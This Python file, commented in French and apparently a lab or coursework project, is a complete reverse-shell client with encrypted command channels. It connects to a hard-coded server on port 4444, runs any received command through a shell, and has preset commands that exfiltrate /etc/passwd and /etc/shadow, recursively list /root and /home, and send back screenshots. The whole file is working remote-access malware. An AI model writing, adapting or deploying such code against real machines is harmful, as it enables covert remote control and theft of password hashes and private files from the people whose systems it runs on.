import socket
import subprocess
import os
from cryptography.fernet import Fernet # 

SERVER_IP = "192.168.161.130" # À changer par l'IP du serveur si besoin
SERVER_PORT = 4444

# --- BONUS CHIFFREMENT (AJOUT 2) ---
# On charge la meme cle que le serveur
try:
    with open("secret.key", "rb") as key_file:
        KEY = key_file.read()
    cipher = Fernet(KEY)
except FileNotFoundError:
    print("[-] Erreur: Fichier secret.key introuvable.")
    exit(1)
# -----------------------------------

def execute_cmd(cmd):
    try:
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return res.stdout + res.stderr
    except Exception as e:
        return str(e)

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((SERVER_IP, SERVER_PORT))
        local_ip = sock.getsockname()[0]
        
        # Le handshake reste en clair pour que le serveur puisse lire l'IP et l'OS
        sock.send(f"{socket.gethostname()} - {local_ip} - Linux".encode())
        
    except Exception as e:
        print(f"Erreur de connexion : {e}")
        return

    while True:
        try:
            # 1. On recoit les donnees brutes du serveur
            data_recue = sock.recv(4096)
            if not data_recue:
                break
            
            # 2. Cas special : la commande "exit" est envoyee en clair par le serveur
            # (C'est plus simple pour la deconnexion propre)
            if data_recue == b"exit":
                break
            
            # 3. On dechiffre la commande recue
            cmd = cipher.decrypt(data_recue).decode('utf-8').strip()

        except Exception as e:
            # Si le serveur envoie une commande non chiffree, on evite de planter
            print(f"[-] Erreur de dechiffrement : {e}")
            continue 

        # --- Tes commandes spécifiques Linux ---
        if cmd == "passwd":
            resultat = execute_cmd("cat /etc/passwd")
        elif cmd == "shadow":
            resultat = execute_cmd("cat /etc/shadow")
        elif cmd == "list_root":
            resultat = execute_cmd("ls -laR /root")
        elif cmd == "list_home":
            resultat = execute_cmd("ls -laR /home")
            
        # --- La capture d'écran (Reste en clair car c'est du binaire) ---
        elif cmd == "screenshot":
            os.system("scrot /tmp/screen.png")
            try:
                with open("/tmp/screen.png", "rb") as f:
                    sock.send(f.read()) # On envoie les bytes bruts
            except FileNotFoundError:
                # Si scrot a échoué (pas d'interface graphique), on envoie une erreur chiffrée
                err_msg = cipher.encrypt(b"Erreur: capture impossible (pas d'ecran)")
                sock.send(err_msg)
            continue  
            
        # --- Commandes normales ---
        else:
            resultat = execute_cmd(cmd)

        # 4. On chiffre le resultat avant de l'envoyer sur le reseau
        try:
            resultat_encrypted = cipher.encrypt(resultat.encode())
            sock.send(resultat_encrypted)
        except Exception as e:
            print(f"[-] Erreur lors du chiffrement de la reponse : {e}")

    sock.close()

if __name__ == "__main__":
    main()